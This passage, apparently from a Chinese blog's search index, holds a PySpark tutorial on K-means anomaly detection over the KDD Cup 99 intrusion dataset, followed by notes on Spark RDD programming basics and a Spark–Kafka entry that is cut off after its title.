'label']from pyspark.sql.types import Rowfrom pyspark.sql.types import StructTypefrom pyspark.sql.types import StructFieldfrom pyspark.sql.types import StringTypefrom pyspark.sql.types import FloatTypefrom pyspark.conf import SparkConffrom pyspark import SparkContextfrom pyspark.sql.session import SparkSession# 构建Dataframeconf = SparkConf().setAppName(\"applicaiton\").set(\"spark.executor.heartbeatInterval\",\"200000\").set(\"spark.network.timeout\",\"300000\")sc = SparkContext.getOrCreate(conf)spark = SparkSession(sc)testRDD = sc.textFile(\"/3/corrected\")fields = list(map( lambda fieldName : StructField(fieldName, StringType(), nullable = True) if fieldName in [\"protocol_type\", \"service\", \"flag\",\"label\"] else StructField(fieldName, FloatType(), nullable = True) , names))schema = StructType(fields)rowRDD = testRDD.map(lambda line : line.split(\",\")).map(lambda attr : Row(float(attr[0]),attr[1],attr[2],attr[3],float(attr[4]),float(attr[5]),float(attr[6]),float(attr[7]),float(attr[8]),float(attr[9]),float(attr[10]),float(attr[11]),float(attr[12]),float(attr[13]),float(attr[14]),float(attr[15]),float(attr[16]),float(attr[17]),float(attr[18]),float(attr[19]),float(attr[20]),float(attr[21]),float(attr[22]),float(attr[23]),float(attr[24]),float(attr[25]),float(attr[26]),float(attr[27]),float(attr[28]),float(attr[29]),float(attr[30]),float(attr[31]),float(attr[32]),float(attr[33]),float(attr[34]),float(attr[35]),float(attr[36]),float(attr[37]),float(attr[38]),float(attr[39]),float(attr[40]),attr[41]))testDF = spark.createDataFrame(rowRDD, schema)dataRDD = sc.textFile(\"/3/kddcup.data\")fields = list(map( lambda fieldName : StructField(fieldName, StringType(), nullable = True) if fieldName in [\"protocol_type\", \"service\", \"flag\",\"label\"] else StructField(fieldName, FloatType(), nullable = True) , names))schema = StructType(fields)rowRDD = dataRDD.map(lambda line : line.split(\",\")).map(lambda attr : Row(float(attr[0]),attr[1],attr[2],attr[3],float(attr[4]),float(attr[5]),float(attr[6]),float(attr[7]),float(attr[8]),float(attr[9]),float(attr[10]),float(attr[11]),float(attr[12]),float(attr[13]),float(attr[14]),float(attr[15]),float(attr[16]),float(attr[17]),float(attr[18]),float(attr[19]),float(attr[20]),float(attr[21]),float(attr[22]),float(attr[23]),float(attr[24]),float(attr[25]),float(attr[26]),float(attr[27]),float(attr[28]),float(attr[29]),float(attr[30]),float(attr[31]),float(attr[32]),float(attr[33]),float(attr[34]),float(attr[35]),float(attr[36]),float(attr[37]),float(attr[38]),float(attr[39]),float(attr[40]),attr[41]))dataDF = spark.createDataFrame(rowRDD, schema) 数据集统计统计数据集中各个类别标号以及每类样本有多少，并展示。 数据集的类别标号以及每类样本数 dataDF.groupBy(\"label\").count().show(10000)+----------------+-------+ | label| count|+----------------+-------+| warezmaster.| 20|| smurf.|2807886|| pod.| 264|| imap.| 12|| nmap.| 2316|| guess_passwd.| 53|| ipsweep.| 12481|| portsweep.| 10413|| satan.| 15892|| land.| 21|| loadmodule.| 9|| ftp_write.| 8||buffer_overflow.| 30|| rootkit.| 10|| warezclient.| 1020|| teardrop.| 979|| perl.| 3|| phf.| 4|| multihop.| 7|| neptune.|1072017|| back.| 2203|| spy.| 2|| normal.| 972781|+----------------+-------+ 测试集的类别标号以及每类样本数 testDF.groupBy(\"label\").count().show(10000) +----------------+------+| label| count|+----------------+------+| snmpguess.| 2406|| xlock.| 9|| warezmaster.| 1602|| processtable.| 759|| smurf.|164091|| pod.| 87|| worm.| 2|| snmpgetattack.| 7741|| mscan.| 1053|| nmap.| 84|| imap.| 1|| xterm.| 13|| sqlattack.| 2|| guess_passwd.| 4367|| mailbomb.| 5000|| xsnoop.| 4|| ipsweep.| 306|| portsweep.| 354|| named.| 17|| satan.| 1633|| land.| 9|| loadmodule.| 2|| ftp_write.| 3|| sendmail.| 17||buffer_overflow.| 22|| httptunnel.| 158|| apache2.| 794|| saint.| 736|| rootkit.| 13|| teardrop.| 12|| perl.| 2|| phf.| 2|| multihop.| 18|| udpstorm.| 2|| neptune.| 58001|| back.| 1098|| ps.| 16|| normal.| 60593|+----------------+------+ 尝试聚类from pyspark.ml import Pipeline,PipelineModelfrom pyspark.ml.clustering import KMeans,KMeansModelfrom pyspark.ml.feature import VectorAssemblerfrom pyspark.sql import DataFrameimport random 用 VectorAssembler 创建一个特征向量，基于这些特征向量用一个 K 均值实现来创建一个模型，再用一个管道将它们拼接在一起。从得到的模型中，可以提取并检验簇群中心。 numericOnly = dataDF.drop(\"protocol_type\", \"service\", \"flag\").cache()assembler = VectorAssembler(inputCols=numericOnly.drop(\"label\").columns, outputCol=\"featureVector\")kmeans = KMeans().setPredictionCol(\"cluster\").setFeaturesCol(\"featureVector\")pipeline = Pipeline().setStages([assembler, kmeans])pipelineModel = pipeline.fit(numericOnly)kmeansModel = pipelineModel.stages[-1]for i in kmeansModel.clusterCenters():print(i) 输出： [4.83401949e+01 1.83462154e+03 8.26203195e+02 5.71611720e-06 6.48779303e-04 7.96173468e-06 1.24376586e-02 3.20510858e-05 1.43529049e-01 8.08830584e-03 6.81851124e-05 3.67464677e-05 1.29349608e-02 1.18874823e-03 7.43095237e-05 1.02114351e-03 0.00000000e+00 4.08294086e-07 8.35165553e-04 3.34973508e+02 2.95267146e+02 1.77970317e-01 1.78036989e-01 5.76648988e-02 5.77299094e-02 7.89884132e-01 2.11796105e-02 2.82608102e-02 2.32981078e+02 1.89214283e+02 7.53713390e-01 3.07109788e-02 6.05051931e-01 6.46410786e-03 1.78091184e-01 1.77885898e-01 5.79276115e-02 5.76592214e-02][1.09990000e+04 0.00000000e+00 1.30993741e+09 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 1.00000000e+00 1.00000000e+00 0.00000000e+00 0.00000000e+00 1.00000000e+00 1.00000000e+00 1.00000000e+00 0.00000000e+00 0.00000000e+00 2.55000000e+02 1.00000000e+00 0.00000000e+00 6.49999976e-01 1.00000000e+00 0.00000000e+00 0.00000000e+00 0.00000000e+00 1.00000000e+00 1.00000000e+00] 对这些数字做一个直观的解释并不容易，但是每一个数字都表示模型生成的一个簇群中心，也称为质心（centroid）。就每个数值输入特征而言，这些值是质心的坐标。 k 的选择如果每个数据点都紧靠最近的质心，则可认为聚类是较优的。这里的 “近” 采用欧氏距离定义。这是评估聚类质量的一种简单又常用的方法，使用与所有点之间距离的平均值，有时也可以使用平方距离的平均值。实际上，KMeansModel 提供了一个 computeCost 方法来计算平方距离的总和，并且很容易用来计算平方距离的平均值。 numericOnly = dataDF.drop(\"protocol_type\", \"service\", \"flag\").cache()# computeCost 方法来计算平方距离的总和，并且很容易用来计算平方距离的平均值。def clusteringScore0(data,k): assembler = VectorAssembler(inputCols=data.drop(\"label\").columns, outputCol=\"featureVector\") kmeans = KMeans().setSeed(int(random.random()*10)).setK(k).setPredictionCol(\"cluster\").setFeaturesCol(\"featureVector\") #.setMaxIter(40).setTol(1.0e-5) pipeline = Pipeline().setStages([assembler, kmeans]) pipelineModel = pipeline.fit(data) kmeansModel = pipelineModel.stages[-1] Srore=kmeansModel.computeCost(assembler.transform(data)) / data.count() return Srorefor k in range(20, 100, 20): print([k, clusteringScore0(numericOnly, k)]) 输出结果： [20, 148277112.23861197] [40, 49940659.143821806][60, 18265796.561388526][80, 15313289.324247833] 输出结果显示得分随着 k 的增加而降低。 增加迭代时间可以优化聚类结果。算法提供了 setTol () 来设置一个阈值，该阈值控制聚类过程中簇质心进行有效移动的最小值。降低该阈值能使质心继续移动更长的时间。使用 setMaxIter () 增加最大迭代次数也可以防止它过早停止，代价是可能需要更多的计算。 def clusteringScore1(data,k): assembler = VectorAssembler(inputCols=data.drop(\"label\").columns, outputCol=\"featureVector\") kmeans = KMeans().setSeed(int(random.random()*10)).setK(k).setPredictionCol(\"cluster\").setFeaturesCol(\"featureVector\").setMaxIter(40).setTol(1.0e-5) pipeline = Pipeline().setStages([assembler, kmeans]) pipelineModel = pipeline.fit(data) kmeansModel = pipelineModel.stages[-1] Srore=kmeansModel.computeCost(assembler.transform(data)) / data.count() return Srorefor k in range(20, 120, 20): print([k, clusteringScore1(numericOnly, k)]) 输出结果： [20, 148277112.23861197] [40, 11564470.915401561][60, 16343181.409780543][80, 22323383.079484705][100, 7572838.84573523] 糟糕的情况是，前面的结果中 k = 80 时的距离居然比 k = 60 的距离大。这不应该发生，因为 k 取更大值时，聚类的结果应该至少与 k 取一个较小值时的结果一样好。问题的原因在于，这种给定 k 值的 K 均值算法并不一定能得到最优聚类。K 均值的迭代过程是从一个随机点开始的，因此可能收敛于一个局部最小值，这个局部最小值可能还不错，但并不是全局最优的。 在 k 过了 100 这个点之后得分下降还是很明显，所以 k 的拐点值应该大于 100。 特征的规范化特征的规范化可以通过将每个特征转换为标准得分来完成。这就是说用对每个特征值求平均，用每个特征值减去平均值，然后除以特征值的标准差。 由于减去平均值相当于把所有数据点沿相同方法移动相同距离，不影响点之间的欧氏距离，所以实际上减去平均值对聚类结果没有影响。 from pyspark.ml.feature import StandardScalerdef clusteringScore2(data,k): assembler = VectorAssembler(inputCols=data.drop(\"label\").columns, outputCol=\"featureVector\") scaler = StandardScaler(inputCol=\"featureVector\", outputCol=\"scaledFeatureVector\", withStd=True, withMean=False) kmeans = KMeans().setSeed(int(random.random()*10)).setK(k).setPredictionCol(\"cluster\").setFeaturesCol(\"scaledFeatureVector\").setMaxIter(40).setTol(1.0e-5) pipeline = Pipeline().setStages([assembler,scaler,kmeans]) pipelineModel = pipeline.fit(data) kmeansModel = pipelineModel.stages[-1] Srore=kmeansModel.computeCost(pipelineModel.transform(data)) / data.count() return Srorefor k in range(60, 300, 30): print([k, clusteringScore2(numericOnly, k)]) 这有助于将维度放到更平等的基准上，而且在绝对的意义上，看点之间的绝对距离（也就是代价）要小得多。然而，k 值还没有出现一个明显的点，超过该点后，增加 k 值对于改善代价没有明显的作用： [60, 1.1611941370693641][90, 0.7236962692254361][120, 0.5581874996147724][150, 0.3886887438817504][180, 0.3333248112741165][210, 0.27497680552057235][240, 0.2556693718314817][270, 0.22710138015576076] 类别型变量归一化使聚类结果有了可贵的进步，但聚类结果还有进一步提升的空间。比如说，几个特征由于不是数值型就被去掉了，于是这些特征里有价值的信息也被丢掉了。如果将这些信息以某种形式加回来，我们应该能得到更好的聚类。 类别型特征可以用 one-hot 编码转换为几个二元特征，这几个二元特征可以看成数值型维度。举个例子，数据集的第二列代表协议类型，取值可能是 tcp、udp 或 icmp。可以把它们看成 3 个特征，分别取名为 is_tcp、is_udp 和 is_icmp。这样，特征值 tcp 就变成 1,0,0，udp 对应 0,1,0，icmp 对应 0,0,1，以此类推。 from pyspark.ml.feature import OneHotEncoder, StringIndexer# 类别型特征可以用 one-hot 编码转换为几个二元特征，这几个二元特征可以看成数值型维度。def oneHotPipeline(inputCol): indexer = StringIndexer(inputCol=inputCol,outputCol=inputCol + \"_indexed\").setHandleInvalid(\"keep\") encoder = OneHotEncoder(inputCol=inputCol + \"_indexed\",outputCol=inputCol + \"_vec\") pipeline = Pipeline().setStages([indexer, encoder]) return (pipeline, inputCol + \"_vec\")def clusteringScore3(data,k): protoTypeEncoder, protoTypeVecCol = oneHotPipeline(\"protocol_type\") serviceEncoder, serviceVecCol = oneHotPipeline(\"service\") flagEncoder, flagVecCol = oneHotPipeline(\"flag\") assembleCols = (set(data.columns)-set([\"label\", \"protocol_type\", \"service\", \"flag\"])).union(set([protoTypeVecCol, serviceVecCol, flagVecCol])) assembler = VectorAssembler(inputCols=list(assembleCols), outputCol=\"featureVector\") scaler = StandardScaler(inputCol=\"featureVector\", outputCol=\"scaledFeatureVector\", withStd=True, withMean=False) kmeans = KMeans().setSeed(int(random.random()*10)).setK(k).setPredictionCol(\"cluster\").setFeaturesCol(\"scaledFeatureVector\").setMaxIter(40).setTol(1.0e-5) pipeline = Pipeline().setStages([protoTypeEncoder, serviceEncoder, flagEncoder, assembler, scaler, kmeans]) pipelineModel = pipeline.fit(data) kmeansModel = pipelineModel.stages[-1] Srore=kmeansModel.computeCost(pipelineModel.transform(data)) / data.count() return Srorefor k in range(60, 300, 30): print([k, clusteringScore3(dataDF, k)]) 输出： [60, 38.01382297522162][90, 16.419330083446177][120, 3.2093992442174235][150, 2.1454678299121843][180, 1.6142523558430413][210, 1.3533093788147306][240, 1.0616778921723296][270, 0.9068134376554267] 局部放大： 这些样本结果表明，从 k = 180 这个点开始，评分值的变化趋于平缓。至少现在聚类使用了所有的输入特征。 利用标号的熵信息标签告诉我们每个数据点的真实性质。好的聚类应该和人工标签保持一致，大部分情况 下，标签相同的数据点应聚在一起，而标签不同的数据点不应该在一起，并且簇内的数据 点标签相同。 良好的聚类结果簇中样本类别大体相同，因而熵值较低。我们可以对各个簇的熵加权平均，将结果作为聚类得分： import numpydef entropy(x): ent = 0.0 x_value_list = [x[i] for i in range(x.shape[0])] n=sum(x_value_list) for x_value in x_value_list: p = float(x_value) / n ent -= p * numpy.log(p) return entdef fitPipeline4(data, k): protoTypeEncoder, protoTypeVecCol = oneHotPipeline(\"protocol_type\") serviceEncoder, serviceVecCol = oneHotPipeline(\"service\") flagEncoder, flagVecCol = oneHotPipeline(\"flag\") assembleCols = (set(data.columns)-set([\"label\", \"protocol_type\", \"service\", \"flag\"])).union(set([protoTypeVecCol, serviceVecCol, flagVecCol])) assembler = VectorAssembler(inputCols=list(assembleCols), outputCol=\"featureVector\") scaler = StandardScaler(inputCol=\"featureVector\", outputCol=\"scaledFeatureVector\", withStd=True, withMean=False) kmeans = KMeans().setSeed(int(random.random()*10)).setK(k).setPredictionCol(\"cluster\").setFeaturesCol(\"scaledFeatureVector\").setMaxIter(40).setTol(1.0e-5) pipeline = Pipeline().setStages([protoTypeEncoder, serviceEncoder, flagEncoder, assembler, scaler, kmeans]) pipelineModel = pipeline.fit(data) return pipelineModel# 良好的聚类结果簇中样本类别大体相同，因而熵值较低。对各个簇的熵加权平均，将结果作为聚类得分def clusteringScore4(data, k): pipelineModel = fitPipeline4(data, k) clusterLabel = pipelineModel.transform(data).select(\"cluster\", \"label\") pd=clusterLabel.toPandas() Sum=0 for name, group in pd.groupby(\"cluster\"): labelsize=group.count()[0] a=numpy.array(group.groupby('label').count()) b=[] for i in range(len(a)): for j in range(len(a[i])): b.append(a[i][j]) One=labelsize*entropy(numpy.array(b)) Sum=Sum+One return Sum/data.count()for k in range(60, 300, 30): print([k, clusteringScore4(dataDF, k)]) 输出结果： [60, 0.038993775215004474][90, 0.02985377476611417][120, 0.02266161774992263][150, 0.020766076760220943][180, 0.017547365257679748][210, 0.012974819022593053][240, 0.007150061376894767][270, 0.00833981903044443] 跟以前一样，可以根据上面的分析结果大致看出 k 的合适取值。随着 k 的增加，熵不一定会减小，因此我们找到的可能是一个局部最小值。这里结果同样表明，k 取 240 可能比较合理，因为它的得分实际上低于 210 以及 270。 聚类实战取 k = 180 pipelineModel = fitPipeline4(dataDF, 180)countByClusterLabel = pipelineModel.transform(dataDF).select(\"cluster\", \"label\").groupBy(\"cluster\", \"label\").count().orderBy(\"cluster\", \"label\")countByClusterLabel.show() 这里我们同样把每个簇的标号打印出来。聚类的结果中大部分属于同一簇，以及其他的少部分簇。 +-------+----------+-------+ |cluster| label| count|+-------+----------+-------+| 0| neptune.| 362876|| 0|portsweep.| 1|| 1| ipsweep.| 40|| 1| nmap.| 6|| 1| normal.| 3421|| 1|portsweep.| 2|| 1| satan.| 11|| 1| smurf.|2807886|| 2| neptune.| 1038|| 2|portsweep.| 13|| 2| satan.| 3|| 3| ipsweep.| 13|| 3| neptune.| 1046|| 3| normal.| 38|| 3|portsweep.| 11|| 3| satan.| 3|| 4| neptune.| 1034|| 4| normal.| 4|| 4|portsweep.| 7|| 4| satan.| 4|+-------+----------+-------+only showing top 20 rows 现在可以建立一个真正的异常检测系统了。异常检测时需要度量新数据点到最近的簇质心 的距离。如果这个距离超过某个阈值，那么就表示这个新数据点是异常的。我们可以把阈 值设为已知数据中离中心最远的第 100 个点到中心的距离。 import os, tempfilefrom pyspark.ml.linalg import Vector, VectorspipelineModel = fitPipeline4(dataDF, 180)kmeansModel = pipelineModel.stages[-1]kmeansModel.save(\"/model/3/kmeansModel\")pipelineModel.save(\"/model/3/pipelineModel\")centroids = kmeansModel.clusterCenters()clustered = pipelineModel.transform(dataDF)threshold=clustered.select(\"cluster\", \"scaledFeatureVector\").rdd.map(lambda a:Vectors.squared_distance(centroids[a.cluster], a.scaledFeatureVector)).sortBy(lambda x: x).take(100)[-1]print(threshold) 输出阈值： 3.232811853048799e-05 最后一步就是在新数据点出现的时候使用阈值进行评估。在 unlabled 数据上进行测试找出异常流量记录，并计算正确率。 clustered = pipelineModel.transform(testDF)anomalies = clustered.rdd.filter(lambda a:Vectors.squared_distance(centroids[a.cluster], a.scaledFeatureVector) &gt;= threshold).collect()n=len(anomalies)v=0for i in anomalies: if i[\"label\"]!='normal.': v=v+1print(\"正确率:\"+str(float(v)/n)) 输出结果： 正确率:0.8051841158484633 取 k = 240 import os, tempfilefrom pyspark.ml.linalg import Vector, VectorspipelineModel = fitPipeline4(dataDF, 240)kmeansModel = pipelineModel.stages[-1]kmeansModel.save(\"/model/3/test/kmeansModel\")pipelineModel.save(\"/model/3/test/pipelineModel\")centroids = kmeansModel.clusterCenters()clustered = pipelineModel.transform(dataDF)threshold=clustered.select(\"cluster\", \"scaledFeatureVector\").rdd.map(lambda a:Vectors.squared_distance(centroids[a.cluster], a.scaledFeatureVector)).sortBy(lambda x: x).take(100)[-1]print(threshold) 7.665805787851659e-06 clustered = pipelineModel.transform(testDF)anomalies = clustered.rdd.filter(lambda a:Vectors.squared_distance(centroids[a.cluster], a.scaledFeatureVector) &gt;= threshold).collect()n=len(anomalies)v=0for i in anomalies: if i[\"label\"]!='normal.': v=v+1print(\"正确率:\"+str(float(v)/n)) 正确率:0.8050769488123118 可以看出 K = 180 是在 unlabled 数据上进行测试找出异常流量记录，计算正确率比 K = 240 有较好的结果。 缩短计算的步长： for k in range(150, 220, 10): print([k, clusteringScore3(dataDF, k)]) 得到评分结果： [150, 2.292921780026778][160, 4.917845778754763][170, 2.0016455721528015][180, 1.7177635513092788][190, 1.5766159846344556][200, 1.5550587983858675][210, 1.2785418817225693] 局部放大： 取 k = 190 import os, tempfilefrom pyspark.ml.linalg import Vector, VectorspipelineModel = fitPipeline4(dataDF, 190)kmeansModel = pipelineModel.stages[-1]kmeansModel.save(\"/model/3/190/kmeansModel\")pipelineModel.save(\"/model/3/190/pipelineModel\")centroids = kmeansModel.clusterCenters()clustered = pipelineModel.transform(dataDF)threshold=clustered.select(\"cluster\", \"scaledFeatureVector\").rdd.map(lambda a:Vectors.squared_distance(centroids[a.cluster], a.scaledFeatureVector)).sortBy(lambda x: x).take(100)[-1]print(threshold) 3.247829147436459e-05 clustered = pipelineModel.transform(testDF)anomalies = clustered.rdd.filter(lambda a:Vectors.squared_distance(centroids[a.cluster], a.scaledFeatureVector) &gt;= threshold).collect()n=len(anomalies)v=0for i in anomalies: if i[\"label\"]!='normal.': v=v+1print(\"正确率:\"+str(float(v)/n)) 正确率:0.8051841158484633 可以看出 K = 190 是在 unlabled 数据上进行测试找出异常流量记录，计算正确率比 K = 180 有较好的结果。"},{"title":"","date":"2020-05-20T07:45:00.000Z","updated":"2022-05-10T02:12:00.000Z","comments":true,"path":"notes/Spark/rdd.html","permalink":"https://blog.mhuig.top/notes/Spark/rdd","excerpt":"","text":"RDD Spark RDD 编程 RDD 编程基础RDD 创建从文件系统中加载数据创建 RDDSpark 采用 textFile() 方法来从文件系统中加载数据创建 RDD该方法把文件的 URI 作为参数，这个 URI 可以是 本地文件系统的地址 分布式文件系统 HDFS 的地址 AmazonS3 的地址 等等 从本地文件系统中加载数据创建 RDD&gt;&gt;&gt; lines = sc.textFile(\"file:///usr/local/spark/mycode/rdd/word.txt\")&gt;&gt;&gt; lines.foreach(print)Hadoop is goodSpark is fastSpark is better 从分布式文件系统 HDFS 中加载数据&gt;&gt;&gt; lines = sc.textFile(\"hdfs://localhost:9000/user/hadoop/word.txt\")&gt;&gt;&gt; lines = sc.textFile(\"/user/hadoop/word.txt\")&gt;&gt;&gt; lines = sc.textFile(\"word.txt\") 通过并行集合（列表）创建 RDD可以调用 SparkContext 的 parallelize 方法，在 Driver 中一个已经存在的集合（列表）上创建。 &gt;&gt;&gt; array = [1,2,3,4,5]&gt;&gt;&gt; rdd = sc.parallelize(array)&gt;&gt;&gt; rdd.foreach(print)12345 RDD 操作转换操作对于 RDD 而言，每一次转换操作都会产生不同的 RDD，供给下一个 “转换” 使用.转换得到的 RDD 是惰性求值的，也就是说，整个转换过程只是记录了转换的轨迹，并不会发生真正的计算，只有遇到行动操作时，才会发生真正的计算，开始从血缘关系源头开始，进行物理的转换操作. 操作 含义 filter(func) 筛选出满足函数 func 的元素，并返回一个新的数据集 map(func) 将每个元素传递到函数 func 中，并将结果返回为一个新的数据集 flatMap(func) 与 map () 相似，但每个输入元素都可以映射到 0 或多个输出结果 groupByKey() 应用于 (K,V) 键值对的数据集时，返回一个新的 (K,Iterable) 形式的数据集 reduceByKey(func) 应用于 (K,V) 键值对的数据集时，返回一个新的 (K,V) 形式的数据集，其中每个值是将每个 key 传递到函数 func 中进行聚合后的结果 filter(func)筛选出满足函数 func 的元素，并返回一个新的数据集 &gt;&gt;&gt; lines = sc.textFile(\"file:///usr/local/spark/mycode/rdd/word.txt\")&gt;&gt;&gt; linesWithSpark = lines.filter(lambda line: \"Spark\" in line)&gt;&gt;&gt; linesWithSpark.foreach(print)Spark is betterSpark is fast map(func)map(func) 操作将每个元素传递到函数 func 中，并将结果返回为一个新的数据集 &gt;&gt;&gt; data = [1,2,3,4,5]&gt;&gt;&gt; rdd1 = sc.parallelize(data)&gt;&gt;&gt; rdd2 = rdd1.map(lambda x:x+10)&gt;&gt;&gt; rdd2.foreach(print)1113121415 flatMap(func)&gt;&gt;&gt; lines = sc.textFile(\"file:///usr/local/spark/mycode/rdd/word.txt\")&gt;&gt;&gt; words = lines.flatMap(lambda line:line.split(\" \")) groupByKey()应用于 (K,V) 键值对的数据集时，返回一个新的 (K, Iterable) 形式的数据集 &gt;&gt;&gt; words = sc.parallelize([(\"Hadoop\",1),(\"is\",1),(\"good\",1), \\... (\"Spark\",1),(\"is\",1),(\"fast\",1),(\"Spark\",1),(\"is\",1),(\"better\",1)])&gt;&gt;&gt; words1 = words.groupByKey()&gt;&gt;&gt; words1.foreach(print)('Hadoop', &lt;pyspark.resultiterable.ResultIterable object at 0x7fb210552c88&gt;)('better', &lt;pyspark.resultiterable.ResultIterable object at 0x7fb210552e80&gt;)('fast', &lt;pyspark.resultiterable.ResultIterable object at 0x7fb210552c88&gt;)('good', &lt;pyspark.resultiterable.ResultIterable object at 0x7fb210552c88&gt;)('Spark', &lt;pyspark.resultiterable.ResultIterable object at 0x7fb210552f98&gt;)('is', &lt;pyspark.resultiterable.ResultIterable object at 0x7fb210552e10&gt;) reduceByKey(func)应用于 (K,V) 键值对的数据集时，返回一个新的 (K, V) 形式的数据集，其中的每个值是将每个 key 传递到函数 func 中进行聚合后得到的结果 &gt;&gt;&gt; words = sc.parallelize([(\"Hadoop\",1),(\"is\",1),(\"good\",1),(\"Spark\",1), \\... (\"is\",1),(\"fast\",1),(\"Spark\",1),(\"is\",1),(\"better\",1)])&gt;&gt;&gt; words1 = words.reduceByKey(lambda a,b:a+b)&gt;&gt;&gt; words1.foreach(print) ('good', 1)('Hadoop', 1)('better', 1)('Spark', 2)('fast', 1)('is', 3) 行动操作行动操作是真正触发计算的地方。Spark 程序执行到行动操作时，才会执行真正的计算，从文件中加载数据，完成一次又一次转换操作，最终，完成行动操作得到结果。 操作 含义 count() 返回数据集中的元素个数 collect() 以数组的形式返回数据集中的所有元素 first() 返回数据集中的第一个元素 take(n) 以数组的形式返回数据集中的前 n 个元素 reduce(func) 通过函数 func（输入两个参数并返回一个值）聚合数据集中的元素 foreach(func) 将数据集中的每个元素传递到函数 func 中运行 惰性机制所谓的 “惰性机制” 是指，整个转换过程只是记录了转换的轨迹，并不会发生真正的计算，只有遇到行动操作时，才会触发 “从头到尾” 的真正的计算这里给出一段简单的语句来解释 Spark 的惰性机制 &gt;&gt;&gt; lines = sc.textFile(\"file:///usr/local/spark/mycode/rdd/word.txt\")&gt;&gt;&gt; lineLengths = lines.map(lambda s:len(s))&gt;&gt;&gt; totalLength = lineLengths.reduce(lambda a,b:a+b)&gt;&gt;&gt; print(totalLength) 持久化在 Spark 中，RDD 采用惰性求值的机制，每次遇到行动操作，都会从头开始执行计算。每次调用行动操作，都会触发一次从头开始的计算。这对于迭代计算而言，代价是很大的，迭代计算经常需要多次重复使用同一组数据 &gt;&gt;&gt; list = [\"Hadoop\",\"Spark\",\"Hive\"]&gt;&gt;&gt; rdd = sc.parallelize(list)&gt;&gt;&gt; print(rdd.count()) //行动操作，触发一次真正从头到尾的计算3&gt;&gt;&gt; print(','.join(rdd.collect())) //行动操作，触发一次真正从头到尾的计算Hadoop,Spark,Hive 可以通过持久化（缓存）机制避免这种重复计算的开销 可以使用 persist() 方法对一个 RDD 标记为持久化 之所以说 “标记为持久化”，是因为出现 persist() 语句的地方，并不会马上计算生成 RDD 并把它持久化，而是要等到遇到第一个行动操作触发真正计算以后，才会把计算结果进行持久化 持久化后的 RDD 将会被保留在计算节点的内存中被后面的行动操作重复使用 &gt;&gt;&gt; list = [\"Hadoop\",\"Spark\",\"Hive\"]&gt;&gt;&gt; rdd = sc.parallelize(list)&gt;&gt;&gt; rdd.cache() #会调用persist(MEMORY_ONLY)，但是，语句执行到这里，并不会缓存rdd，因为这时rdd还没有被计算生成&gt;&gt;&gt; print(rdd.count()) #第一次行动操作，触发一次真正从头到尾的计算，这时上面的rdd.cache()才会被执行，把这个rdd放到缓存中3&gt;&gt;&gt; print(','.join(rdd.collect())) #第二次行动操作，不需要触发从头到尾的计算，只需要重复使用上面缓存中的rddHadoop,Spark,Hive 分区RDD 是弹性分布式数据集，通常 RDD 很大，会被分成很多个分区，分别保存在不同的节点上RDD 分区的一个原则是使得分区的个数尽量等于集群中的 CPU 核心（core）数目 键值对 RDD键值对 RDD 的创建从文件中加载可以采用多种方式创建键值对 RDD，其中一种主要方式是使用 map() 函数来实现 &gt;&gt;&gt; lines = sc.textFile(\"file:///usr/local/spark/mycode/pairrdd/word.txt\")&gt;&gt;&gt; pairRDD = lines.flatMap(lambda line:line.split(\" \")).map(lambda word:(word,1))&gt;&gt;&gt; pairRDD.foreach(print)('I', 1)('love', 1)('Hadoop', 1)…… 通过并行集合（列表）创建 RDD&gt;&gt;&gt; list = [\"Hadoop\",\"Spark\",\"Hive\",\"Spark\"]&gt;&gt;&gt; rdd = sc.parallelize(list)&gt;&gt;&gt; pairRDD = rdd.map(lambda word:(word,1))&gt;&gt;&gt; pairRDD.foreach(print)(Hadoop,1)(Spark,1)(Hive,1)(Spark,1) 常用的键值对 RDD 转换操作reduceByKey(func)使用 func 函数合并具有相同键的值 &gt;&gt;&gt; pairRDD = sc.parallelize([(\"Hadoop\",1),(\"Spark\",1),(\"Hive\",1),(\"Spark\",1)])&gt;&gt;&gt; pairRDD.reduceByKey(lambda a,b:a+b).foreach(print)('Spark', 2)('Hive', 1)('Hadoop', 1) groupByKey()对具有相同键的值进行分组 &gt;&gt;&gt; list = [(\"spark\",1),(\"spark\",2),(\"hadoop\",3),(\"hadoop\",5)]&gt;&gt;&gt; pairRDD = sc.parallelize(list)&gt;&gt;&gt; pairRDD.groupByKey()PythonRDD[27] at RDD at PythonRDD.scala:48&gt;&gt;&gt; pairRDD.groupByKey().foreach(print)('hadoop', &lt;pyspark.resultiterable.ResultIterable object at 0x7f2c1093ecf8&gt;)('spark', &lt;pyspark.resultiterable.ResultIterable object at 0x7f2c1093ecf8&gt;) sortByKey()返回一个根据键排序的 RDD &gt;&gt;&gt; list = [(\"Hadoop\",1),(\"Spark\",1),(\"Hive\",1),(\"Spark\",1)]&gt;&gt;&gt; pairRDD = sc.parallelize(list)&gt;&gt;&gt; pairRDD.foreach(print)('Hadoop', 1)('Spark', 1)('Hive', 1)('Spark', 1)&gt;&gt;&gt; pairRDD.sortByKey().foreach(print)('Hadoop', 1)('Hive', 1)('Spark', 1)('Spark', 1) mapValues(func)对键值对 RDD 中的每个 value 都应用一个函数，但是，key 不会发生变化 &gt;&gt;&gt; list = [(\"Hadoop\",1),(\"Spark\",1),(\"Hive\",1),(\"Spark\",1)]&gt;&gt;&gt; pairRDD = sc.parallelize(list)&gt;&gt;&gt; pairRDD1 = pairRDD.mapValues(lambda x:x+1)&gt;&gt;&gt; pairRDD1.foreach(print)('Hadoop', 2)('Spark', 2)('Hive', 2)('Spark', 2) joinjoin 就表示内连接。对于内连接，对于给定的两个输入数据集 (K,V1) 和 (K,V2)，只有在两个数据集中都存在的 key 才会被输出，最终得到一个 (K,(V1,V2)) 类型的数据集。 &gt;&gt;&gt; pairRDD1 = sc. \\... parallelize([(\"spark\",1),(\"spark\",2),(\"hadoop\",3),(\"hadoop\",5)])&gt;&gt;&gt; pairRDD2 = sc.parallelize([(\"spark\",\"fast\")])&gt;&gt;&gt; pairRDD3 = pairRDD1.join(pairRDD2)&gt;&gt;&gt; pairRDD3.foreach(print)('spark', (1, 'fast'))('spark', (2, 'fast'))"},{"title":"","date":"2021-02-07T13:57:00.000Z","updated":"2022-05-10T02:13:00.000Z","comments":true,"path":"notes/Spark/streaming-kafka.html","permalink":"https://blog.mhuig.top/notes/Spark/streaming-kafka","excerpt":"","text":"Streaming &amp; Kafka SparkStreaming 整合 Kafka SparkStreaming 整合 